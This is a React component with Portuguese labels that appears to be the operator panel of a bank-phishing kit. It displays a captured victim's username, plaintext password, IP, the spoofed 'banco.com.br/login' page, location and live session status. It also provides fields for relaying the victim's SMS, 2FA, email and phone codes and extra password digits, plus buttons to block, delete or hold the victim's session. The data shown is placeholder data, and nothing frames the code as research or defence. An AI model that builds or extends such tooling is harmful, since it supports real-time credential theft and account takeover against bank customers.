
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Shield, Trash2, Clock, Monitor, Globe, User, Lock, MapPin } from "lucide-react";
import { useState, useEffect } from "react";

interface CountryData {
  name: { common: string };
  flags: { svg: string };
}

export const UserDetails = () => {
  const [countryData, setCountryData] = useState<CountryData | null>(null);

  useEffect(() => {
    // Fetch Brazil flag data
    fetch('https://restcountries.com/v3.1/alpha/BR')
      .then(response => response.json())
      .then(data => setCountryData(data[0]))
      .catch(error => console.error('Error fetching country data:', error));
  }, []);

  return (
    <Card className="bg-gray-800 border-gray-700 max-w-4xl">
      <CardContent className="p-4">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Seção Esquerda - Informações do Usuário */}
          <div className="space-y-4">
            <div className="bg-gray-700 rounded-lg p-4">
              <h3 className="text-white font-bold text-lg mb-3">carlos74</h3>
              
              <div className="space-y-2 text-sm">
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <User className="h-3 w-3 text-gray-400" />
                    <span className="text-gray-300">Usuário:</span>
                  </div>
                  <span className="text-white">carlos74</span>
                </div>
                
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <Lock className="h-3 w-3 text-gray-400" />
                    <span className="text-gray-300">Senha:</span>
                  </div>
                  <span className="text-white">pass123!</span>
                </div>
                
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <Globe className="h-3 w-3 text-gray-400" />
                    <span className="text-gray-300">IP:</span>
                  </div>
                  <span className="text-white">192.168.1.104</span>
                </div>
                
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <Globe className="h-3 w-3 text-gray-400" />
                    <span className="text-gray-300">Página:</span>
                  </div>
                  <span className="text-white text-xs">banco.com.br/login</span>
                </div>
                
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    {countryData && (
                      <img 
                        src={countryData.flags.svg} 
                        alt="Brazil flag" 
                        className="h-3 w-4 object-cover rounded-sm"
                      />
                    )}
                    <span className="text-gray-300">País:</span>
                  </div>
                  <span className="text-white">Brasil</span>
                </div>
                
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <MapPin className="h-3 w-3 text-gray-400" />
                    <span className="text-gray-300">Cidade:</span>
                  </div>
                  <span className="text-white">São Paulo</span>
                </div>
                
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <Monitor className="h-3 w-3 text-gray-400" />
                    <span className="text-gray-300">Dispositivo:</span>
                  </div>
                  <span className="text-white">iPhone</span>
                </div>
                
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <Clock className="h-3 w-3 text-gray-400" />
                    <span className="text-gray-300">ID Sessão:</span>
                  </div>
                  <span className="text-white">SID123456</span>
                </div>
                
                <div className="flex items-center justify-between">
                  <span className="text-gray-300">Status:</span>
                  <div className="flex items-center space-x-1">
                    <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                    <span className="text-green-400 text-xs">Online</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Seção Direita - Respostas e Ações */}
          <div className="space-y-4">
            {/* Grid de Respostas */}
            <div className="bg-gray-700 rounded-lg p-4">
              <h4 className="text-white font-medium mb-3">Respostas</h4>
              
              <div className="grid grid-cols-2 gap-2 mb-4">
                {[
                  { label: 'SMS', value: 'Incorreto' },
                  { label: 'AUTH', value: 'Incorreto' },
                  { label: '2FA', value: 'Incorreto' },
                  { label: 'EMAIL', value: 'Incorreto' },
                  { label: 'TEL', value: 'Incorreto' }
                ].map((item, index) => (
                  <div key={index} className="bg-gray-600 rounded p-2">
                    <div className="text-xs text-gray-300 mb-1">{item.label}</div>
                    <input 
                      type="text" 
                      className="w-full bg-gray-800 text-white text-xs p-1 rounded border-gray-500"
                      placeholder="Resposta"
                    />
                    <div className="text-xs text-red-400 mt-1">{item.value}</div>
                  </div>
                ))}
              </div>

              {/* Senhas Adicionais */}
              <div className="space-y-2">
                <h5 className="text-white text-sm font-medium">Senhas Adicionais</h5>
                {['SENHA 4', 'SENHA 6', 'SENHA 8'].map((senha, index) => (
                  <div key={index} className="flex items-center justify-between bg-gray-600 rounded p-2">
                    <span className="text-gray-300 text-xs">{senha}:</span>
                    <div className="flex items-center space-x-2">
                      <input 
                        type="text" 
                        className="bg-gray-800 text-white text-xs p-1 rounded border-gray-500 w-16"
                        placeholder="****"
                      />
                      <span className="text-red-400 text-xs">Incorreto</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Botões de Ação */}
            <div className="space-y-2">
              <Button className="w-full bg-red-600 hover:bg-red-700 text-white" size="sm">
                <Shield className="h-3 w-3 mr-2" />
                Bloquear
              </Button>
              <Button className="w-full bg-red-800 hover:bg-red-900 text-white" size="sm">
                <Trash2 className="h-3 w-3 mr-2" />
                Excluir
              </Button>
              <Button className="w-full bg-yellow-600 hover:bg-yellow-700 text-white" size="sm">
                <Clock className="h-3 w-3 mr-2" />
                Aguardar
              </Button>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};
